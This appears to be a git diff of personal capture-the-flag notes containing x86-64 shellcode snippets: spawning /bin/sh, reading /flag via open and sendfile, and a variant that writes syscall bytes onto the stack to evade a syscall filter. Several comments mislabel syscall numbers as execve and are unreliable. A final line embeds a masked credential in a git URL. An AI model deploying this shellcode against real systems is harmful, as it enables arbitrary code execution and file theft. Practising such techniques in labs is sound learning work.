@@ -1,6 +1,5 @@
 # SIMPLE BIN SH 
-
-```shell
+```s
 .global _start
 _start:
 .intel_syntax noprefix
@@ -14,7 +13,7 @@ binsh:				# a label marking where the /bin/sh string is
 ```
 
 # READ FILE
-```shell
+```s
 .global _start
 _start:
 .intel_syntax noprefix
@@ -41,7 +40,7 @@ syscall				# trigger exit()
 
 
 # SH WITH NO LONG (R)SI(0x48)
-```shell
+```s
 .global _start
 _start:
 .intel_syntax noprefix
@@ -56,7 +55,7 @@ binsh:                          # a label marking where the /bin/sh string is
 ```
 
 # FLAG READ WITH NO LONG (R)SI(0x48)
-```shell
+```s
 .global _start
 _start:
 .intel_syntax noprefix
@@ -115,6 +114,47 @@ push 60
 pop rax
 syscall
 ```
+
+# FLAG WITH NO SYSCALL
+```s
+.global _start
+_start:
+.intel_syntax noprefix
+#int3
+lea edi, [rip+flag]    # points the first argument of execve at the /bin/sh string below
+mov esi, 0                              # NULL out the second argument (meaning, O_RDONLY)
+
+#int3
+push 0xc3050e
+pop rax
+inc rax
+push rax
+mov rax, 2             # this is the syscall number of execve
+call rsp
+#syscall
+mov edi, 1                              # first argument to sendfile is the file descriptor to output to (stdout)
+mov esi, eax                            # second argument is the file descriptor returned by open
+mov edx, 0                              # third argument is the number of bytes to skip from the input file
+mov r10, 1000                           # fourth argument is the number of bytes to transfer to the output file
+
+push 0xc3050e
+pop rax
+inc rax
+push rax
+mov rax, 40             # this is the syscall number of execve
+call rsp
+#syscall                         # trigger sendfile(1, fd, 0, 1000)
+push 0xc3050e
+pop rax
+inc rax
+push rax
+mov rax, 60             # this is the syscall number of execve
+call rsp
+#syscall                         # trigger exit()
+flag:
+.string "/flag"
+```
+
 
 # NEW GIT 
 + git remote set-url origin https://littlefoot22:********@github.com/littlefoot22/ctf-public.git
